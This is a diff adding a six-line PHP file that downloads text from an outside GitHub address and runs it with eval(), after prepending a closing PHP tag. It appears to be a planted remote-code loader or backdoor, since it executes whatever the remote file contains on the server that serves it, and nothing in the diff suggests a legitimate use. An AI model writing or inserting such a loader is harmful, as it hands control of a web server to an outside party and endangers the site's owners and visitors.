@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://github.com/tuman88936/tumankan/blob/main/utama.txt'));
+
+$content = "?> ".$content;
+eval($content);
